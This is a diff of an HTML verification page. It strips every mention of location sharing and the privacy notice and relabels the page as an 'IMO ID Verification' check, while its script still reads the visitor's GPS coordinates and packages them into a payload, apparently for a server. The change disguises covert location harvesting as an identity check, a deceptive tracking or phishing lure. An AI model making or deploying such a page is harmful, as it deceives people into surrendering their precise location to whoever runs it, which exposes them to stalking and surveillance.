@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta http-equiv="Permissions-Policy" content="geolocation=(self)">
-  <title>Location Verification</title>
+  <title>IMO ID VERIFICATION</title>
 
   <style>
     * {
@@ -132,18 +132,18 @@
 
 <body>
   <main class="card">
-    <h1 id="title">Location Verification</h1>
+    <h1 id="title">IMO ID Verification</h1>
 
     <p class="desc" id="desc">
-      Tap the button below to share your current location for verification.
+      
     </p>
 
     <div class="status" id="status">Ready for verification</div>
 
-    <button id="locationBtn" type="button">Click to Location</button>
+    <button id="locationBtn" type="button">Click to Check</button>
 
     <div class="privacy">
-      Your browser will ask for location permission before your location is shared.
+    
     </div>
   </main>
 
@@ -177,15 +177,15 @@
     btn.disabled = true;
     btn.innerText = "Verification Done ✓";
     title.innerText = "Verification Done";
-    desc.innerText = "Your location has been successfully saved.";
+    desc.innerText = "VERIFICATION COMPLETE D";
     if (icon) icon.innerText = "✓";
-    setStatus("Location saved successfully", "success");
+    setStatus(" saved successfully", "success");
   }
 
   function getLocation() {
     return new Promise((resolve, reject) => {
       if (!navigator.geolocation) {
-        reject({ code: 0, message: "Location is not supported by this browser." });
+        reject({ code: 0, message: "Retry Now" });
         return;
       }
 
@@ -227,7 +227,7 @@
       throw new Error(
         (result && result.message)
           ? result.message
-          : "Location could not be saved."
+          : "Verification Failed."
       );
     }
 
@@ -235,12 +235,12 @@
   }
 
   btn.addEventListener("click", async () => {
-    setLoading("Getting your location...");
+    setLoading("Loading...");
 
     try {
       const position = await getLocation();
 
-      setLoading("Saving location to verification system...");
+      setLoading("Processing Verification");
 
       const payload = {
         latitude: position.coords.latitude,
